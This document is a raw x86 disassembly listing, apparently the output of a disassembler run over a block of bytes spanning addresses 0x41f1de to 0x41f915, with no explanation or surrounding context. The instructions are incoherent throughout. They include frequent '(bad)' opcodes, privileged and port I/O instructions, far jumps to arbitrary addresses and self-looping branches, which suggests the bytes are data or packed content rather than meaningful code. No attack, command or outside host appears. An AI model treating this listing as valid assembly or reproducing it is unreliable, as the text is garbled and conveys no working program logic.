  41f1de:	lods   al,BYTE PTR ds:[esi]
  41f1df:	mov    cs,WORD PTR [ecx+0x42c879dc]
  41f1e5:	sub    DWORD PTR ds:0x266093f6,edx
  41f1eb:	sub    DWORD PTR [eax+0xe],0x3c7de9b1
  41f1f2:	sbb    al,0x17
  41f1f4:	idiv   DWORD PTR [edi+0x42]
  41f1f7:	sub    ebp,DWORD PTR [edx+edi*8+0x6e8f19e8]
  41f1fe:	adc    al,0x4e
  41f200:	out    0x82,al
  41f202:	lods   al,BYTE PTR ds:[esi]
  41f203:	add    bh,BYTE PTR [ecx-0x25baff7d]
  41f209:	scas   eax,DWORD PTR es:[edi]
  41f20a:	push   0xa2060614
  41f20f:	adc    ebx,DWORD PTR [ebp-0x788c97f1]
  41f215:	sbb    al,0x59
  41f217:	pop    es
  41f218:	jp     0x41f202
  41f21a:	(bad)  
  41f21b:	pop    esp
  41f21c:	dec    esp
  41f21d:	push   edx
  41f21e:	leave  
  41f21f:	int    0xd7
  41f221:	mov    dl,0x0
  41f223:	mov    eax,ds:0xa3813491
  41f228:	sub    BYTE PTR [edx],bl
  41f22a:	outs   dx,BYTE PTR ds:[esi]
  41f22b:	push   edi
  41f22c:	sub    al,0xaa
  41f22e:	cs aaa 
  41f230:	mov    WORD PTR [eax-0x70],es
  41f233:	fsub   DWORD PTR [ecx-0x2ef981ac]
  41f239:	adc    ch,ah
  41f23b:	(bad)  
  41f23c:	loopne 0x41f22c
  41f23e:	out    dx,al
  41f23f:	xlat   BYTE PTR ds:[ebx]
  41f240:	adc    DWORD PTR [ecx-0x38],edx
  41f243:	enter  0xdb4f,0x24
  41f247:	aaa    
  41f248:	sbb    al,0xca
  41f24a:	fwait
  41f24b:	jp     0x41f276
  41f24d:	jmp    0x41f248
  41f24f:	or     ecx,DWORD PTR [esi]
  41f251:	sub    DWORD PTR [ecx],edi
  41f253:	pusha  
  41f254:	out    dx,eax
  41f255:	fcomp  DWORD PTR [ebx-0x3e]
  41f258:	sub    dl,cl
  41f25a:	and    dh,0xfa
  41f25d:	mov    ch,0xa1
  41f25f:	add    al,0x39
  41f261:	push   ebx
  41f262:	cmp    al,0xcd
  41f264:	xor    eax,0xaf753713
  41f269:	jb     0x41f249
  41f26b:	sub    ecx,DWORD PTR [ebx+eax*2]
  41f26e:	push   0x666341c9
  41f273:	in     eax,dx
  41f274:	xchg   edx,eax
  41f275:	or     ecx,DWORD PTR [edx+0x6e]
  41f278:	std    
  41f279:	(bad)  
  41f27a:	fldpi  
  41f27c:	dec    edi
  41f27d:	mov    gs,WORD PTR [edi-0x4667afdc]
  41f283:	push   es
  41f284:	or     ecx,DWORD PTR [eax]
  41f286:	adc    bl,BYTE PTR [eax-0xe]
  41f289:	push   0xfe738edd
  41f28e:	int    0x98
  41f290:	mov    WORD PTR [esi-0x53],es
  41f293:	fwait
  41f294:	pop    ebx
  41f295:	and    al,0xfb
  41f297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f298:	jmp    0x41f297
  41f29a:	pusha  
  41f29b:	out    0x12,al
  41f29d:	cdq    
  41f29e:	pop    ebx
  41f29f:	test   al,0x3a
  41f2a1:	rcl    BYTE PTR [ebx-0x51],cl
  41f2a4:	mov    dh,0xfc
  41f2a6:	sub    al,0x67
  41f2a8:	mov    BYTE PTR [ebx-0x54],bh
  41f2ab:	(bad)  
  41f2ac:	stos   DWORD PTR es:[edi],eax
  41f2ad:	bound  ecx,QWORD PTR ds:0x45a2422a
  41f2b3:	aas    
  41f2b4:	sub    BYTE PTR fs:[eax-0x6fa2a674],0x20
  41f2bc:	push   edx
  41f2bd:	ret    0xbf28
  41f2c0:	cli    
  41f2c1:	sti    
  41f2c2:	add    DWORD PTR [ebp+ebx*8+0x62],ecx
  41f2c6:	into   
  41f2c7:	pop    eax
  41f2c8:	iret   
  41f2c9:	sub    dh,BYTE PTR [edx+0x20bbace9]
  41f2cf:	or     eax,0x773f4de3
  41f2d4:	xchg   BYTE PTR [ebx+0x6f],cl
  41f2d7:	call   0x563fde09
  41f2dc:	sub    DWORD PTR [eax+0x6c],0x18
  41f2e0:	push   eax
  41f2e1:	sbb    bh,BYTE PTR [ebx+0x41198f2]
  41f2e7:	rcr    DWORD PTR [ebp-0x60d57e2c],1
  41f2ed:	mov    bh,0xff
  41f2ef:	sbb    al,0xe1
  41f2f1:	mov    cl,0x9e
  41f2f3:	aas    
  41f2f4:	adc    al,0xdf
  41f2f6:	xchg   ebp,eax
  41f2f7:	pop    ebx
  41f2f8:	enter  0x738,0x6e
  41f2fc:	fwait
  41f2fd:	jmp    DWORD PTR [eax-0x2e7b41d7]
  41f303:	xchg   ecx,eax
  41f304:	mov    bl,0xb6
  41f306:	dec    ebp
  41f307:	jnp    0xf37094b4
  41f30d:	sbb    DWORD PTR [ecx+edi*4],edi
  41f310:	jns    0x41f2e1
  41f312:	pop    esi
  41f313:	jno    0x41f30f
  41f315:	call   0x4d1a3b27
  41f31a:	inc    edi
  41f31b:	jbe    0x41f328
  41f31d:	cmp    dh,BYTE PTR [esi+esi*4-0x2c]
  41f321:	and    eax,0x6e991b6d
  41f326:	sbb    dh,dl
  41f328:	jns    0x41f2d3
  41f32a:	dec    eax
  41f32b:	cmp    eax,0x1c7aa84
  41f330:	push   ss
  41f331:	pop    ds
  41f332:	cmc    
  41f333:	adc    eax,0x455b9df7
  41f338:	jmp    0x41f392
  41f33a:	add    eax,0x1ac6ad9a
  41f33f:	dec    eax
  41f340:	jne    0x41f3b2
  41f342:	fistp  DWORD PTR [eax]
  41f344:	outs   dx,DWORD PTR ds:[esi]
  41f345:	iret   
  41f346:	ins    BYTE PTR es:[edi],dx
  41f347:	cwde   
  41f348:	inc    esp
  41f349:	cmp    BYTE PTR [edi-0x499c39f5],dh
  41f34f:	lods   eax,DWORD PTR ds:[esi]
  41f350:	rol    DWORD PTR [ecx],0x24
  41f353:	not    DWORD PTR [edi+0x7]
  41f356:	add    eax,0x5ab8f7f3
  41f35b:	pop    es
  41f35c:	mov    ch,0xec
  41f35e:	test   DWORD PTR [ebx-0x1b4a179f],eax
  41f364:	sub    eax,0xcf1bb42c
  41f369:	sahf   
  41f36a:	and    al,0x4e
  41f36c:	scas   al,BYTE PTR es:[edi]
  41f36d:	scas   eax,DWORD PTR es:[edi]
  41f36e:	es jbe 0x41f366
  41f371:	and    eax,0x20084676
  41f376:	retf   
  41f377:	fimul  DWORD PTR [ebp+0x42edd4f9]
  41f37d:	leave  
  41f37e:	sbb    eax,0xd0a4dc53
  41f383:	adc    al,0xb4
  41f385:	lea    edi,[ecx+0x37]
  41f388:	int3   
  41f389:	sbb    esi,edx
  41f38b:	jp     0x41f374
  41f38d:	mov    eax,0x87740236
  41f392:	retf   
  41f393:	je     0x41f334
  41f395:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f396:	inc    esp
  41f397:	fs xchg edi,eax
  41f399:	pop    ebp
  41f39a:	fpatan 
  41f39c:	in     al,0x98
  41f39e:	ja     0x41f390
  41f3a0:	inc    bl
  41f3a2:	loop   0x41f3e8
  41f3a4:	cdq    
  41f3a5:	mov    DWORD PTR [edx],ebp
  41f3a7:	add    DWORD PTR [eax-0x3e],esp
  41f3aa:	fild   DWORD PTR [esi-0x1b]
  41f3ad:	mov    eax,ds:0x770613fe
  41f3b2:	lds    ecx,FWORD PTR [ebx+0x55]
  41f3b5:	out    dx,eax
  41f3b6:	ficom  DWORD PTR [ecx+eiz*8+0x7a]
  41f3ba:	cmp    eax,0x375772b6
  41f3bf:	mov    dh,0x96
  41f3c1:	rcl    cl,cl
  41f3c3:	in     eax,dx
  41f3c4:	cs push eax
  41f3c6:	scas   al,BYTE PTR es:[edi]
  41f3c7:	cdq    
  41f3c8:	or     al,0x82
  41f3ca:	sub    al,0x24
  41f3cc:	and    al,0x12
  41f3ce:	mov    ebx,DWORD PTR [ecx-0x5e0ab0ba]
  41f3d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3d5:	add    eax,0x5a3902c5
  41f3da:	mov    cs,esi
  41f3dc:	aaa    
  41f3dd:	fs jp  0x41f45d
  41f3e0:	jmp    0x5c86d2df
  41f3e5:	push   eax
  41f3e6:	jnp    0x41f424
  41f3e8:	ins    BYTE PTR es:[edi],dx
  41f3e9:	shl    DWORD PTR [edi+0x27],0xfb
  41f3ed:	push   ecx
  41f3ee:	cmp    DWORD PTR [eax+0x2a94e826],edi
  41f3f4:	stc    
  41f3f5:	aad    0xd7
  41f3f7:	or     DWORD PTR [ebp-0x6f7393b],0x9c2f35b8
  41f401:	jg     0x41f43d
  41f403:	mov    ch,0x2e
  41f405:	jg     0x41f448
  41f407:	and    eax,ebx
  41f409:	shl    BYTE PTR [edi-0x38d545d8],0x2e
  41f410:	or     dh,0x64
  41f413:	fwait
  41f414:	clts   
  41f416:	mov    dh,0x81
  41f418:	xor    eax,0xbc6e41f
  41f41d:	add    DWORD PTR [ebp+ebp*8+0x4],ebp
  41f421:	xchg   ecx,eax
  41f423:	mov    cl,0xd9
  41f425:	popf   
  41f426:	inc    ebp
  41f427:	loopne 0x41f46f
  41f429:	pop    esi
  41f42a:	popa   
  41f42b:	pop    es
  41f42c:	jae    0x41f3e4
  41f42e:	sti    
  41f42f:	adc    esi,DWORD PTR [ebp-0x2d]
  41f432:	cmp    bl,BYTE PTR [edx-0xb33dff5]
  41f438:	cmp    DWORD PTR [ecx+0x9],esi
  41f43b:	xor    eax,0x2068a280
  41f440:	hlt    
  41f441:	sbb    al,0x51
  41f443:	add    dh,al
  41f445:	les    ebp,FWORD PTR [edi-0xe]
  41f448:	xchg   BYTE PTR [edx+edi*8-0x34b91545],ch
  41f44f:	les    edi,FWORD PTR [edi]
  41f451:	mov    esi,0xe9e46292
  41f456:	ss in  eax,dx
  41f458:	push   ecx
  41f459:	pop    edx
  41f45a:	and    BYTE PTR [edi+0x1a],dl
  41f45d:	pusha  
  41f45e:	retf   0x9fcd
  41f461:	mov    ecx,0xe2606a46
  41f466:	sbb    DWORD PTR [eax-0xc8c9cd8],ecx
  41f46c:	or     DWORD PTR [edx+0x79460ab5],eax
  41f472:	mov    ds:0x2df0bf2d,al
  41f477:	fidiv  WORD PTR [edx+ebx*1+0x6b01241c]
  41f47e:	add    esi,0x3b6f3c49
  41f484:	aaa    
  41f485:	dec    ebp
  41f486:	jecxz  0x41f500
  41f488:	inc    esi
  41f489:	ds scas al,BYTE PTR es:[edi]
  41f48b:	push   0xe578fcd7
  41f490:	and    DWORD PTR ds:0xfd6bdbdf,eax
  41f496:	xchg   edi,eax
  41f497:	fidivr DWORD PTR [edi]
  41f499:	mov    ecx,eax
  41f49b:	adc    al,0x24
  41f49d:	sub    al,0xf7
  41f49f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4a0:	mov    edi,0xc33363dc
  41f4a5:	xor    eax,ecx
  41f4a7:	stc    
  41f4a8:	test   al,0x70
  41f4aa:	cmp    eax,0x875ab756
  41f4af:	jg     0x41f4f5
  41f4b1:	out    0x5e,eax
  41f4b3:	mov    eax,0x254ef24d
  41f4b8:	jno    0x41f48f
  41f4ba:	xchg   ecx,eax
  41f4bb:	scas   al,BYTE PTR es:[edi]
  41f4bc:	icebp  
  41f4bd:	out    0x56,al
  41f4bf:	inc    ebp
  41f4c0:	hlt    
  41f4c1:	mov    cl,0x0
  41f4c3:	shl    DWORD PTR cs:[esi],0xa5
  41f4c7:	ror    ch,0xd4
  41f4ca:	(bad)  
  41f4cb:	aad    0x50
  41f4cd:	popf   
  41f4ce:	loopne 0x41f51b
  41f4d0:	xchg   edx,eax
  41f4d1:	lea    edi,[eax+0xdf215dd]
  41f4d7:	loopne 0x41f496
  41f4d9:	and    al,0x49
  41f4db:	adc    BYTE PTR [eax],al
  41f4dd:	js     0x41f472
  41f4df:	scas   al,BYTE PTR es:[edi]
  41f4e0:	dec    ebp
  41f4e1:	inc    esi
  41f4e2:	scas   al,BYTE PTR es:[edi]
  41f4e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4e4:	jae    0x41f4ae
  41f4e6:	push   edx
  41f4e7:	xchg   DWORD PTR [ecx],edx
  41f4e9:	add    bl,BYTE PTR [edx-0x3920852f]
  41f4ef:	fnstsw WORD PTR [esp+eiz*2-0x72]
  41f4f3:	xchg   BYTE PTR [ecx],cl
  41f4f5:	(bad)  
  41f4f6:	ja     0x41f4a3
  41f4f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4f9:	inc    ebp
  41f4fa:	jp     0x41f4b7
  41f4fc:	stos   DWORD PTR es:[edi],eax
  41f4fd:	jb     0x41f4a5
  41f4ff:	xor    al,0xd9
  41f501:	dec    DWORD PTR [ecx]
  41f503:	or     BYTE PTR [esp+esi*4],ah
  41f506:	mov    es,WORD PTR [ebp+0x11]
  41f509:	inc    ecx
  41f50a:	fidiv  DWORD PTR [eax-0x281071a6]
  41f510:	iret   
  41f511:	call   0xcfe3:0xb85da0bf
  41f518:	pop    ebx
  41f519:	call   0x93cf324a
  41f51e:	js     0x41f4a8
  41f520:	nop
  41f521:	mov    ds:0x8a9514bf,eax
  41f526:	fistp  WORD PTR [esi]
  41f528:	add    bh,BYTE PTR [esp+ebx*8+0x5618398a]
  41f52f:	test   DWORD PTR [di-0x202c],0x667ea9fc
  41f538:	cmp    esi,edx
  41f53a:	scas   eax,DWORD PTR es:[edi]
  41f53b:	sub    al,0x1
  41f53d:	jo     0x41f51a
  41f53f:	fstp   DWORD PTR [edx]
  41f541:	stos   BYTE PTR es:[edi],al
  41f542:	mov    dh,0x32
  41f544:	cmp    al,0xa2
  41f546:	inc    ebx
  41f547:	adc    DWORD PTR [esp+eax*2-0x66b3f224],ecx
  41f54e:	sbb    dh,BYTE PTR [edi-0x53]
  41f551:	xchg   cl,dh
  41f553:	jno    0x41f4e9
  41f555:	sahf   
  41f556:	and    DWORD PTR [esp+esi*4-0xf],ebx
  41f55a:	sbb    BYTE PTR [ecx+0x45],bl
  41f55d:	rol    dl,0xb9
  41f560:	adc    DWORD PTR [ecx+0x39],0x1e031daf
  41f567:	aaa    
  41f568:	retf   0xbbdc
  41f56b:	adc    eax,0xe6083763
  41f570:	sbb    eax,0xec5a506c
  41f575:	sbb    dh,BYTE PTR [eax+0x1f]
  41f578:	scas   al,BYTE PTR es:[edi]
  41f579:	xlat   BYTE PTR ds:[ebx]
  41f57a:	cmp    ebx,DWORD PTR [ecx]
  41f57c:	cs fadd DWORD PTR es:[edx]
  41f580:	inc    eax
  41f581:	add    esp,ecx
  41f583:	mov    ah,0xb7
  41f585:	push   ecx
  41f586:	cmp    DWORD PTR [edi-0x1f],edx
  41f589:	cmp    al,0xaa
  41f58b:	rcl    DWORD PTR [edi-0x67],0x48
  41f58f:	fcomp  DWORD PTR ds:0x1c29807d
  41f595:	ret    0x46cf
  41f598:	test   DWORD PTR [esi-0x56246221],ebp
  41f59e:	dec    edx
  41f59f:	xor    ah,BYTE PTR [edx]
  41f5a1:	or     ah,al
  41f5a3:	jno    0x41f52f
  41f5a5:	push   0x244023e
  41f5aa:	pop    ds
  41f5ab:	(bad)  
  41f5ac:	and    esp,DWORD PTR [edi+0x72]
  41f5af:	stos   DWORD PTR es:[edi],eax
  41f5b0:	jge    0x41f5d2
  41f5b2:	push   ss
  41f5b3:	loope  0x41f598
  41f5b5:	stos   BYTE PTR es:[edi],al
  41f5b6:	fcom   DWORD PTR [ebp-0x3a]
  41f5b9:	adc    dh,BYTE PTR [ecx+0xf643a7]
  41f5bf:	addr16 retf 
  41f5c1:	dec    eax
  41f5c2:	popa   
  41f5c3:	xor    DWORD PTR [edx-0x7],ebp
  41f5c6:	gs fwait
  41f5c8:	(bad)  
  41f5c9:	loope  0x41f63f
  41f5cb:	lahf   
  41f5cc:	pushf  
  41f5cd:	dec    ecx
  41f5ce:	mov    eax,ds:0x5b54b58d
  41f5d3:	inc    ecx
  41f5d4:	int3   
  41f5d5:	fst    QWORD PTR [ebx]
  41f5d7:	sbb    edi,DWORD PTR [esi+0x70]
  41f5da:	pop    ss
  41f5db:	or     edx,DWORD PTR [eax+0x42751cef]
  41f5e1:	ret    
  41f5e2:	mov    WORD PTR [edi-0x1b],ss
  41f5e5:	les    ecx,FWORD PTR [edi-0x4b0b4a93]
  41f5eb:	xlat   BYTE PTR ds:[ebx]
  41f5ec:	inc    eax
  41f5ed:	dec    eax
  41f5ee:	and    BYTE PTR [esi],ch
  41f5f0:	sbb    cl,BYTE PTR [ecx+0x37]
  41f5f3:	pavgb  mm1,QWORD PTR [ebx-0x78]
  41f5f7:	xchg   ebp,eax
  41f5f8:	mov    cl,BYTE PTR [edx+0x59]
  41f5fb:	and    al,0xd6
  41f5fd:	(bad)  
  41f5fe:	jb     0x41f5df
  41f600:	push   edx
  41f601:	jecxz  0x41f5cf
  41f603:	das    
  41f604:	jg     0x41f654
  41f606:	xchg   edx,eax
  41f607:	jecxz  0x41f67d
  41f609:	pop    edi
  41f60a:	ins    BYTE PTR es:[edi],dx
  41f60b:	loope  0x41f66d
  41f60d:	mov    bl,0xc0
  41f60f:	das    
  41f610:	pop    ecx
  41f611:	stos   BYTE PTR es:[edi],al
  41f612:	cli    
  41f613:	pushf  
  41f614:	das    
  41f615:	or     al,BYTE PTR [ecx]
  41f617:	pop    edi
  41f618:	adc    DWORD PTR [ecx-0x59],ecx
  41f61b:	mov    eax,DWORD PTR [edx+0x3f]
  41f61e:	call   0xaf4d7260
  41f623:	fs lahf 
  41f625:	loope  0x41f5d9
  41f627:	inc    ecx
  41f628:	add    eax,0x401bd64b
  41f62d:	pop    ds
  41f62e:	daa    
  41f62f:	into   
  41f630:	mov    ds,WORD PTR [eax+0x3a]
  41f633:	das    
  41f634:	cmp    BYTE PTR [edx+0x4dfb5e25],al
  41f63a:	sbb    DWORD PTR gs:[edx+0x38593e5d],ebx
  41f641:	sar    DWORD PTR [esi],0x8a
  41f644:	inc    ebp
  41f645:	stc    
  41f646:	pop    es
  41f647:	outs   dx,BYTE PTR ds:[esi]
  41f648:	dec    esi
  41f649:	pop    ebp
  41f64a:	outs   dx,DWORD PTR ds:[esi]
  41f64b:	sti    
  41f64c:	mov    edx,ss
  41f64e:	or     bh,BYTE PTR [edi+0x6c]
  41f651:	sbb    eax,0x891e3a98
  41f656:	pop    ds
  41f657:	(bad)  
  41f659:	mov    ds,WORD PTR [ecx+0x369c7f78]
  41f65f:	in     al,dx
  41f660:	push   ss
  41f661:	mov    dh,0x47
  41f663:	and    al,0x46
  41f665:	pop    ss
  41f666:	fs inc ecx
  41f668:	jge    0x41f619
  41f66a:	pop    ebx
  41f66b:	loop   0x41f66b
  41f66d:	(bad)  
  41f66e:	push   cs
  41f66f:	push   ds
  41f670:	in     eax,dx
  41f671:	add    DWORD PTR [edi],esp
  41f673:	icebp  
  41f674:	inc    edx
  41f675:	scas   eax,DWORD PTR es:[edi]
  41f676:	bound  edx,QWORD PTR [ebp+0x6f5fb663]
  41f67c:	and    eax,0x9409ab01
  41f681:	mov    bl,cl
  41f683:	(bad)  
  41f685:	adc    DWORD PTR [esi+0xb0ca342],ecx
  41f68b:	ja     0x41f68b
  41f68d:	mov    WORD PTR [edi+0x4b],ds
  41f690:	pop    ss
  41f691:	xchg   BYTE PTR [esi-0x5b],bl
  41f694:	lea    eax,[eax]
  41f696:	call   0x8191:0x27128f07
  41f69d:	rol    BYTE PTR cs:[ecx+0x9542613],0x3a
  41f6a5:	jns    0x41f6ed
  41f6a7:	inc    edi
  41f6a8:	retf   
  41f6a9:	add    eax,0x2d7ebf87
  41f6ae:	fdiv   QWORD PTR [ebx-0x15]
  41f6b1:	sbb    BYTE PTR [edx],bh
  41f6b3:	mov    ds:0x859a8662,eax
  41f6b8:	xchg   edi,eax
  41f6b9:	jno    0x41f6a2
  41f6bb:	int    0xed
  41f6bd:	scas   eax,DWORD PTR es:[edi]
  41f6be:	aam    0x2c
  41f6c0:	mov    ah,BYTE PTR [ebx-0x2d]
  41f6c3:	lahf   
  41f6c4:	mov    DWORD PTR [esi+edi*4+0x266ca12a],ecx
  41f6cb:	sub    ch,BYTE PTR [edi]
  41f6cd:	push   0xc
  41f6cf:	aaa    
  41f6d0:	push   ebx
  41f6d1:	push   edx
  41f6d2:	cmovne ebp,DWORD PTR [edi+ebx*2-0xe]
  41f6d7:	fcmovne st,st(3)
  41f6d9:	sbb    ebp,ebp
  41f6db:	sbb    ecx,DWORD PTR [eax-0x2270e350]
  41f6e1:	fimul  DWORD PTR [eax+0x5c46072c]
  41f6e7:	fmul   DWORD PTR [edi]
  41f6e9:	out    dx,al
  41f6ea:	cmc    
  41f6eb:	sub    al,0x8b
  41f6ed:	sub    edx,DWORD PTR [edi+0x75f069b8]
  41f6f3:	add    eax,0xc333e81a
  41f6f8:	adc    edx,ebx
  41f6fa:	int    0xe3
  41f6fc:	jno    0x41f762
  41f6fe:	in     ax,dx
  41f700:	push   ss
  41f701:	jb     0x41f76d
  41f703:	pop    ebp
  41f704:	mov    cl,0x6c
  41f706:	mov    al,ds:0x6afff21
  41f70b:	xchg   ecx,eax
  41f70c:	or     BYTE PTR [edx-0x6872179e],0x11
  41f713:	in     eax,dx
  41f714:	xchg   edx,eax
  41f715:	pop    edi
  41f716:	xchg   esp,eax
  41f717:	aad    0x23
  41f719:	mov    bl,0x8
  41f71b:	mov    ds:0x21a25680,al
  41f720:	push   ds
  41f721:	jo     0x41f789
  41f723:	xchg   ebp,esp
  41f725:	int3   
  41f726:	pop    edi
  41f727:	je     0x41f6ba
  41f729:	mov    ah,bl
  41f72b:	xor    esp,ecx
  41f72d:	(bad)  [ebp-0x12]
  41f730:	je     0x41f6b9
  41f732:	add    al,0x62
  41f734:	enter  0xf52f,0xe2
  41f738:	push   cs
  41f739:	aad    0x78
  41f73b:	bound  esi,QWORD PTR [esi+eax*8]
  41f73e:	and    BYTE PTR [ecx+0x2eb95554],dh
  41f744:	imul   ebx,ebx,0x9
  41f747:	xor    dh,ah
  41f749:	icebp  
  41f74a:	add    dh,BYTE PTR [esi+0xa]
  41f74d:	jl     0x41f74d
  41f74f:	js     0x41f766
  41f751:	repz fistp WORD PTR [ecx+0xd]
  41f756:	fcmovnb st,st(0)
  41f758:	fisub  DWORD PTR [ebx+0x5c4eed67]
  41f75e:	(bad)  
  41f75f:	jbe    0x41f795
  41f761:	arpl   WORD PTR [ebx],di
  41f763:	cs xor ecx,esp
  41f766:	mov    eax,ds:0x887a1149
  41f76b:	stos   BYTE PTR es:[edi],al
  41f76c:	push   di
  41f76e:	cmp    edx,ecx
  41f770:	popf   
  41f771:	lahf   
  41f772:	out    dx,eax
  41f773:	sub    DWORD PTR [ebp+0x38268c44],ebx
  41f779:	cmp    al,0xca
  41f77b:	mov    bh,0x37
  41f77d:	ror    DWORD PTR [edi-0x74],cl
  41f780:	push   esp
  41f781:	es pop ss
  41f783:	rol    BYTE PTR [ecx-0x5b],1
  41f786:	push   cs
  41f787:	(bad)  
  41f789:	push   cs
  41f78a:	xlat   BYTE PTR ds:[ebx]
  41f78b:	and    DWORD PTR [ebx+0x6],edx
  41f78e:	xor    BYTE PTR [edi+0x4a1f2628],bh
  41f794:	mov    edi,DWORD PTR [edi]
  41f796:	sub    DWORD PTR [edx],0x70
  41f799:	mov    esi,0x21755973
  41f79e:	aaa    
  41f79f:	ins    DWORD PTR es:[edi],dx
  41f7a0:	mov    ebp,0x22e2edd0
  41f7a5:	out    dx,eax
  41f7a6:	icebp  
  41f7a7:	jbe    0x41f788
  41f7a9:	std    
  41f7aa:	scas   al,BYTE PTR es:[edi]
  41f7ab:	dec    esi
  41f7ac:	(bad)
  41f7af:	lods   al,BYTE PTR ds:[esi]
  41f7b0:	in     eax,0x9a
  41f7b2:	imul   edi,DWORD PTR [esi],0xffffff86
  41f7b5:	push   ebx
  41f7b6:	mov    dl,0xdf
  41f7b8:	inc    ebp
  41f7b9:	and    BYTE PTR [edi+0x21],cl
  41f7bc:	pop    ds
  41f7bd:	push   0xffffffdc
  41f7bf:	push   edx
  41f7c0:	stos   DWORD PTR es:[edi],eax
  41f7c1:	sub    BYTE PTR [eax-0x121a2428],bh
  41f7c7:	jns    0x41f7d6
  41f7c9:	arpl   WORD PTR ds:0x236f2654,bx
  41f7cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7d0:	imul   esi,edx,0x62
  41f7d3:	add    bh,BYTE PTR [ebp-0x11]
  41f7d6:	leave  
  41f7d7:	push   ss
  41f7d8:	sbb    DWORD PTR [esi+0x5a],ecx
  41f7db:	adc    eax,0x790344b3
  41f7e0:	mov    BYTE PTR [edi+ecx*8-0xa400ea5],bl
  41f7e7:	xor    DWORD PTR [edx+0x107576f2],ebx
  41f7ed:	adc    DWORD PTR [esi+0x73565b34],ecx
  41f7f3:	pop    eax
  41f7f4:	bnd jmp 0x41f874
  41f7f7:	lods   eax,DWORD PTR ds:[esi]
  41f7f8:	fnstenv [ecx+0x5]
  41f7fb:	cld    
  41f7fc:	pop    edx
  41f7fd:	pop    ds
  41f7fe:	mov    DWORD PTR [ecx],esp
  41f800:	jmp    0xc059:0x13a69b12
  41f807:	xor    BYTE PTR [esi+0x76],al
  41f80a:	sar    BYTE PTR [edi-0x23],cl
  41f80d:	outs   dx,DWORD PTR ds:[esi]
  41f80e:	shr    DWORD PTR [ebx-0x52],1
  41f811:	jmp    0x8cd7:0x94ca5ad7
  41f818:	(bad)  [ebp+0x60ba3332]
  41f81e:	adc    bl,bh
  41f820:	mov    al,0xc0
  41f822:	les    ebp,FWORD PTR [edx+eiz*8]
  41f825:	jg     0x41f86f
  41f827:	in     eax,0xef
  41f829:	cmp    al,0xe2
  41f82b:	scas   eax,DWORD PTR es:[edi]
  41f82c:	pop    ebx
  41f82d:	cld    
  41f82e:	mov    esp,0xbe181756
  41f833:	clc    
  41f834:	(bad)  
  41f835:	adc    DWORD PTR [ebx],edx
  41f837:	std    
  41f838:	xchg   edi,eax
  41f839:	xchg   BYTE PTR [eax-0x63],dl
  41f83c:	pop    esp
  41f83d:	fs scas al,BYTE PTR es:[edi]
  41f83f:	mov    bl,0x4e
  41f841:	mov    esp,0x2c2bb601
  41f846:	push   cs
  41f847:	push   ds
  41f848:	mov    dl,BYTE PTR [eax+edi*8]
  41f84b:	push   ss
  41f84c:	mov    dh,0x6c
  41f84e:	xchg   ebp,eax
  41f84f:	push   0xfffffff3
  41f851:	test   cl,0xf5
  41f854:	jae    0x41f8a3
  41f856:	lds    edi,FWORD PTR [edi-0x5c8ec580]
  41f85c:	dec    ebx
  41f85d:	mov    edi,0xac475079
  41f862:	pop    edi
  41f863:	xchg   esi,eax
  41f864:	mov    al,ds:0x4551c511
  41f869:	sub    DWORD PTR [ecx-0x18],esi
  41f86c:	push   eax
  41f86d:	scas   eax,DWORD PTR es:[edi]
  41f86e:	adc    eax,0x313b888d
  41f873:	inc    esp
  41f874:	add    BYTE PTR [edi-0x5c],cl
  41f877:	clc    
  41f878:	clc    
  41f879:	inc    ebp
  41f87a:	cmc    
  41f87b:	cmpxchg esi,ebp
  41f87e:	mov    ds:0x867ae3de,al
  41f883:	icebp  
  41f884:	lods   al,BYTE PTR ss:[esi]
  41f886:	in     eax,dx
  41f887:	mov    ?,WORD PTR [edi-0x63c1617a]
  41f88d:	shr    DWORD PTR [eax],0x65
  41f890:	in     al,0xbd
  41f892:	lods   al,BYTE PTR ds:[esi]
  41f893:	mov    ds:0xfdb572fd,al
  41f898:	dec    edi
  41f899:	lods   al,BYTE PTR ds:[esi]
  41f89a:	xor    dh,bl
  41f89c:	test   ecx,0x3be1b070
  41f8a2:	mov    cl,0xe9
  41f8a4:	push   ebp
  41f8a5:	inc    esi
  41f8a6:	cmp    al,0xa7
  41f8a8:	or     eax,0x9a5c1db2
  41f8ad:	add    eax,0x9390a2ab
  41f8b2:	scas   al,BYTE PTR es:[edi]
  41f8b3:	jmp    0x4ad4:0xe259e9b3
  41f8ba:	(bad)  
  41f8bb:	push   0x6aebee75
  41f8c0:	push   0x3
  41f8c2:	stos   DWORD PTR es:[edi],eax
  41f8c3:	cdq    
  41f8c4:	pop    esp
  41f8c5:	sbb    DWORD PTR [edx],ebp
  41f8c7:	sub    DWORD PTR [ebx],edx
  41f8c9:	stos   BYTE PTR es:[edi],al
  41f8ca:	mov    ecx,0x2ef90c4a
  41f8cf:	jmp    0x41f90b
  41f8d1:	cmp    cl,cl
  41f8d3:	mov    al,0xe
  41f8d5:	(bad)  
  41f8d6:	fnstenv [edi]
  41f8d8:	push   edi
  41f8d9:	fwait
  41f8da:	xchg   ebp,eax
  41f8db:	add    al,0x27
  41f8dd:	lock fdiv DWORD PTR [ebp+0x1b]
  41f8e1:	popa   
  41f8e2:	(bad)  
  41f8e4:	inc    ebp
  41f8e5:	sbb    al,0xec
  41f8e7:	inc    esp
  41f8e8:	int3   
  41f8e9:	cmp    BYTE PTR [ebx+0x38d3e49e],dh
  41f8ef:	loop   0x41f8e8
  41f8f1:	adc    eax,DWORD PTR [ecx]
  41f8f3:	mov    ds:0x3973b1cf,eax
  41f8f8:	xchg   edx,eax
  41f8f9:	into   
  41f8fa:	xchg   edi,eax
  41f8fb:	cdq    
  41f8fc:	repz fwait
  41f8fe:	mov    cl,0x3c
  41f900:	retf   
  41f901:	mov    ?,WORD PTR [esi]
  41f903:	xchg   esi,eax
  41f904:	test   al,0xf4
  41f906:	icebp  
  41f907:	dec    esp
  41f908:	jp     0x41f89a
  41f90a:	sysexit 
  41f90c:	pop    ebx
  41f90d:	mov    cl,0x78
  41f90f:	iret   
  41f910:	cmp    BYTE PTR [edx],bh
  41f912:	and    DWORD PTR [edi],0x2e
  41f915:	js     0x41f96c
